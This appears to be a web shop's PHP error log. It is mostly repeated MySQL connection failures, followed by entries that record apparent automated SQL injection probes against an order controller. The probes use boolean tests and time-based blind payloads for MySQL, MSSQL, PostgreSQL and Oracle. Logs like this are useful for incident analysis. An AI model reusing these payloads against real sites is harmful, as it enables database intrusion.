*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2006] MySQL server has gone away at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:37: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:38: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:38: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:38: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:39: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:39: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:39: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:39: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:39: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:40: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:40: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:40: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:41: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:41: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:42: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:42: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:42: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:42: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:42: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:43: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:43: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:43: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:43: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 10:52:43: Link to database cannot be established:SQLSTATE[HY000] [2002] Connection refused at line 102 in file classes/db/DbPDO.php
*ERROR* 	2024/07/30 - 22:12:05: Unknown method "updateMessagevHAEuDBC" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:12:14: Unknown method "updateMessage' AND 2*3*8=6*8 AND 'MvQs'='MvQs" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:12:14: Unknown method "updateMessage" AND 2*3*8=6*8 AND "2MkA"="2MkA" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:12:14: Unknown method "updateMessage%' AND 2*3*8=6*8 AND 'n4rT'!='n4rT%" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:12:15: Unknown method "-1 OR 2+745-745-1=0+0+0+1" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:12:15: Unknown method "-1 OR 3+745-745-1=0+0+0+1" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:12:15: Unknown method "updateMessage'||'" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:12:30: Unknown method "if(now()=sysdate(),sleep(15),0)" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:12:39: Unknown method "updateMessage0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:13:06: Unknown method "updateMessage0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:13:13: Unknown method "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:13:22: Unknown method "updateMessage-1 waitfor delay '0:0:15' -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:13:30: Unknown method "updateMessageYqEzZc5w'; waitfor delay '0:0:15' -- " at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:13:57: Unknown method "updateMessageaIcA5TyA' OR 128=(SELECT 128 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:14:24: Unknown method "updateMessageXOXTB1zN') OR 483=(SELECT 483 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:14:42: Unknown method "updateMessagehoFypdcu')) OR 316=(SELECT 316 FROM PG_SLEEP(15))--" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:15:07: Unknown method "updateMessage'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:15:07: Unknown method "updateMessage'"" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:15:07: Unknown method "updateMessage¿ß¿¢%2527%2522'"" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 22:15:07: Unknown method "@@OiJKK" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:17:59: Unknown method "updateTOSStatusAndGetPaymentsSBcghwVd" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:08: Unknown method "updateTOSStatusAndGetPayments' AND 2*3*8=6*8 AND 'gSzk'='gSzk" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:09: Unknown method "updateTOSStatusAndGetPayments" AND 2*3*8=6*8 AND "D6l0"="D6l0" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:09: Unknown method "updateTOSStatusAndGetPayments%' AND 2*3*8=6*8 AND 'Wu11'!='Wu11%" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:09: Unknown method "-1 OR 2+664-664-1=0+0+0+1" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:09: Unknown method "-1 OR 3+664-664-1=0+0+0+1" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:09: Unknown method "updateTOSStatusAndGetPayments'||'" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:21: Unknown method "if(now()=sysdate(),sleep(15),0)" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:33: Unknown method "updateTOSStatusAndGetPayments0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z" at line 315 in file controllers/front/OrderOpcController.php
*ERROR* 	2024/07/30 - 23:18:43: Unknown method "updateTOSStatusAndGetPayments0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z" at line 315 in file controllers/front/OrderOpcController.php
